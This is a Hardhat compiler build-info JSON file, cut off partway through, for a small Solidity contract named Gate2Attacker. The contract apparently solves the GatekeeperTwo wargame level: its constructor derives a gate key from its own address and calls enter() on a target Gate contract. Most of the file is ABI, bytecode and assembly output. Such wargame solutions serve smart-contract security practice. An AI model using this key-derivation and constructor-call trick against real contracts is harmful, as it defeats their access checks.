{
	"id": "f3a713f0e40bca99f5b4d314fe73d574",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contract/security/GateAttackerLV2.sol": {
				"content": "pragma solidity ^0.6.0;\r\n\r\ninterface Gate{\r\n    function enter(bytes8 _gateKey) external returns (bool);\r\n}\r\n\r\ncontract Gate2Attacker{\r\n\r\n    constructor(address addr) public {\r\n        Gate impl = Gate(addr);\r\n        bytes8 input = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));\r\n        impl.enter(input);\r\n    }\r\n}\r\n\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contract/security/GateAttackerLV2.sol": {
				"Gate": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bytes8",
									"name": "_gateKey",
									"type": "bytes8"
								}
							],
							"name": "enter",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"enter(bytes8)": "3370204e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes8\",\"name\":\"_gateKey\",\"type\":\"bytes8\"}],\"name\":\"enter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/GateAttackerLV2.sol\":\"Gate\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/GateAttackerLV2.sol\":{\"keccak256\":\"0x633b7c9df3920894bca23ef687360812fd809f2237d255d6c5e0c637ddd22983\",\"urls\":[\"bzz-raw://668b4f75321be9d8d560e9c2e8fe55c26e529321eec74d0c18f14aaf518038e5\",\"dweb:/ipfs/QmR2Pnnbi8wrF6oLQpUNrgskd8xV8Nn6Ri7k2v5iiK915q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Gate2Attacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "addr",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contract/security/GateAttackerLV2.sol\":111:357  contract Gate2Attacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/GateAttackerLV2.sol\":142:354  constructor(address addr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/GateAttackerLV2.sol\":186:195  Gate impl */\n  0x00\n    /* \"contract/security/GateAttackerLV2.sol\":203:207  addr */\n  dup2\n    /* \"contract/security/GateAttackerLV2.sol\":186:208  Gate impl = Gate(addr) */\n  swap1\n  pop\n    /* \"contract/security/GateAttackerLV2.sol\":219:231  bytes8 input */\n  0x00\n    /* \"contract/security/GateAttackerLV2.sol\":315:316  1 */\n  0x01\n    /* \"contract/security/GateAttackerLV2.sol\":310:311  0 */\n  0x00\n    /* \"contract/security/GateAttackerLV2.sol\":303:316  uint64(0) - 1 */\n  sub\n    /* \"contract/security/GateAttackerLV2.sol\":290:294  this */\n  address\n    /* \"contract/security/GateAttackerLV2.sol\":265:296  abi.encodePacked(address(this)) */\n  add(0x20, mload(0x40))\n  dup1\n  dup3\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x60\n  shl\n  dup2\n  mstore\n  0x14\n  add\n  swap2\n  pop\n  pop\n  mload(0x40)\n  0x20\n  dup2\n  dup4\n  sub\n  sub\n  dup2\n  mstore\n  swap1\n  0x40\n  mstore\n    /* \"contract/security/GateAttackerLV2.sol\":255:297  keccak256(abi.encodePacked(address(this))) */\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  keccak256\n    /* \"contract/security/GateAttackerLV2.sol\":241:299  uint64(bytes8(keccak256(abi.encodePacked(address(this))))) */\n  0xc0\n  shr\n    /* \"contract/security/GateAttackerLV2.sol\":241:317  uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1) */\n  xor\n    /* \"contract/security/GateAttackerLV2.sol\":234:318  bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)) */\n  0xc0\n  shl\n    /* \"contract/security/GateAttackerLV2.sol\":219:318  bytes8 input = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)) */\n  swap1\n  pop\n    /* \"contract/security/GateAttackerLV2.sol\":329:333  impl */\n  dup2\n    /* \"contract/security/GateAttackerLV2.sol\":329:339  impl.enter */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x3370204e\n    /* \"contract/security/GateAttackerLV2.sol\":340:345  input */\n  dup3\n    /* \"contract/security/GateAttackerLV2.sol\":329:346  impl.enter(input) */\n  mload(0x40)\n  dup3\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  dup1\n  dup3\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\n  pop\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  dup1\n  extcodesize\n  iszero\n  dup1\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  pop\n  gas\n  call\n  iszero\n  dup1\n  iszero\n  tag_7\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_7:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  0x20\n  dup2\n  lt\n  iszero\n  tag_8\n  jumpi\n  0x00\n  dup1\n  revert\ntag_8:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n  pop\n    /* \"contract/security/GateAttackerLV2.sol\":142:354  constructor(address addr) public {\r... */\n  pop\n  pop\n  pop\n    /* \"contract/security/GateAttackerLV2.sol\":111:357  contract Gate2Attacker{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/GateAttackerLV2.sol\":111:357  contract Gate2Attacker{\r... */\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220adcdf8985306f8ebba6f7c71521d85e3959bbcf273cc8f33875dcb845b7b95e764736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516101933803806101938339818101604052602081101561003357600080fd5b810190808051906020019092919050505060008190506000600160000330604051602001808273ffffffffffffffffffffffffffffffffffffffff1660601b81526014019150506040516020818303038152906040528051906020012060c01c1860c01b90508173ffffffffffffffffffffffffffffffffffffffff16633370204e826040518263ffffffff1660e01b8152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b15801561010757600080fd5b505af115801561011b573d6000803e3d6000fd5b505050506040513d602081101561013157600080fd5b810190808051906020019092919050505050505050603f806101546000396000f3fe6080604052600080fdfea2646970667358221220adcdf8985306f8ebba6f7c71521d85e3959bbcf273cc8f33875dcb845b7b95e764736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x193 CODESIZE SUB DUP1 PUSH2 0x193 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SUB ADDRESS PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0xC0 SHR XOR PUSH1 0xC0 SHL SWAP1 POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3370204E DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x107 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x11B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x131 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP POP POP PUSH1 0x3F DUP1 PUSH2 0x154 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAD 0xCD 0xF8 SWAP9 MSTORE8 MOD 0xF8 0xEB 0xBA PUSH16 0x7C71521D85E3959BBCF273CC8F33875D 0xCB DUP5 JUMPDEST PUSH28 0x95E764736F6C634300060C0033000000000000000000000000000000 ",
							"sourceMap": "111:246:0:-:0;;;142:212;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;186:9;203:4;186:22;;219:12;315:1;310;303:13;290:4;265:31;;;;;;;;;;;;;;;;;;;;;;;;;;;;;255:42;;;;;;241:58;;:76;234:84;;219:99;;329:4;:10;;;340:5;329:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;142:212;;;111:246;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600080fdfea2646970667358221220adcdf8985306f8ebba6f7c71521d85e3959bbcf273cc8f33875dcb845b7b95e764736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAD 0xCD 0xF8 SWAP9 MSTORE8 MOD 0xF8 0xEB 0xBA PUSH16 0x7C71521D85E3959BBCF273CC8F33875D 0xCB DUP5 JUMPDEST PUSH28 0x95E764736F6C634300060C0033000000000000000000000000000000 ",
							"sourceMap": "111:246:0:-:0;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "12600",
								"executionCost": "infinite",
								"totalCost": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 111,
									"end": 357,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 111,
									"end": 357,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 111,
									"end": 357,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 142,
									"end": 354,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 186,
									"end": 195,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 203,
									"end": 207,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 186,
									"end": 208,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 186,
									"end": 208,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 219,
									"end": 231,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 315,
									"end": 316,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 310,
									"end": 311,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 303,
									"end": 316,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 290,
									"end": 294,
									"name": "ADDRESS",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "60"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "SHL",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "14"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 265,
									"end": 296,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 265,
									"end": 296,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 255,
									"end": 297,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 255,
									"end": 297,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 255,
									"end": 297,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 255,
									"end": 297,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 255,
									"end": 297,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 255,
									"end": 297,
									"name": "KECCAK256",
									"source": 0
								},
								{
									"begin": 241,
									"end": 299,
									"name": "PUSH",
									"source": 0,
									"value": "C0"
								},
								{
									"begin": 241,
									"end": 299,
									"name": "SHR",
									"source": 0
								},
								{
									"begin": 241,
									"end": 317,
									"name": "XOR",
									"source": 0
								},
								{
									"begin": 234,
									"end": 318,
									"name": "PUSH",
									"source": 0,
									"value": "C0"
								},
								{
									"begin": 234,
									"end": 318,
									"name": "SHL",
									"source": 0
								},
								{
									"begin": 219,
									"end": 318,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 219,
									"end": 318,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 333,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 339,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 329,
									"end": 339,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 329,
									"end": 339,
									"name": "PUSH",
									"source": 0,
									"value": "3370204E"
								},
								{
									"begin": 340,
									"end": 345,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFF"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "E0"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SHL",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "4"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP8",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "EXTCODESIZE",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "tag",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "GAS",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "CALL",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "RETURNDATACOPY",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "tag",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
